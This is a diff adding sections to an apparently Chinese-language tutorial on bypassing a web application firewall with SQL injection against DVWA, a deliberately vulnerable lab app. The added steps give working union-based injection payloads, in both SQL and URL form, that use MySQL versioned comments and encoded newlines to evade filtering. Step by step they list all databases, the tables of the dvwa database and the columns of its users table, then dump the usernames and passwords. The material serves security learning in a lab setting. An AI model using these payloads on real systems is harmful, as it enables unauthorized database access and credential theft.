@@ -70,6 +70,50 @@ http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' regexp "%0A%23" /*!11144u
 http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' regexp "%0A%23" /*!11144union %0A select */database(%0A /*!11144*/),user(%0A /*!11144*/)-- &Submit=Submit#
 ```
 ![image](https://github.com/498946975/Security/blob/master/images/waf_20.png)
-
-
+### 6、获取所有库的名称
+```sql
+select user,password from users where user_id='-1' union /*!-- /*
+select/*!1,*/ group_concat(schema_name)   /*!from*/      /*!-- /*
+information_schema./*!schemata*/ --; -- ';
+```
+![image](https://github.com/498946975/Security/blob/master/images/waf_21.png)
+在url中
+```shell script
+http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=-1' union /*!--+/*%0aselect/*!1,*/ group_concat(schema_name) /*!from*/ /*!-- +/*%0ainformation_schema./*!schemata*/ --+
+```
+### 7、获取dvwa库的所有表名
+```sql
+select user,password from users where user_id='-1' union /*!-- /*
+select/*!1,*/ group_concat(table_name)   /*!from*/      /*!-- /*
+information_schema./*!tables*/  where table_schema='dvwa'; -- ';
+```
+![image](https://github.com/498946975/Security/blob/master/images/waf_22.png)
+在url中
+```shell script
+http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=-1' union /*!--+/*%0aselect/*!1,*/ group_concat(table_name) /*!from*/ /*!-- +/*%0ainformation_schema./*!tables*/ where table_schema='dvwa' --+
+```
+### 8、获取user表的所有字段
+```sql
+select user,password from users where user_id='-1' union /*!-- /*
+select/*!1,*/ group_concat(column_name)   /*!from*/      /*!-- /*
+information_schema./*!columns*/  where table_name='users'; -- ';
+```
+![image](https://github.com/498946975/Security/blob/master/images/waf_23.png)
+在url中
+```shell script
+http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=-1' union /*!--+/*%0aselect/*!1,*/ group_concat(column_name) /*!from*/ /*!-- +/*%0ainformation_schema./*!columns*/ where table_name='users' --+
+```
+### 9、获取账号密码
+```sql
+select user,password from users where user_id='-1' union /*!-- /*
+select/*!1,*/ group_concat(concat_ws(0x7e,user,password))  /*!from*/  dvwa.users; -- ';
+```
+```yaml
+user内容～password内容
+```
+![image](https://github.com/498946975/Security/blob/master/images/waf_24.png)
+在url中
+```shell script
+http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=-1' union /*!--+/*%0aselect/*!1,*/ group_concat(concat_ws(0x7e,user,password)) /*!from*/ dvwa.users --+
+```
 
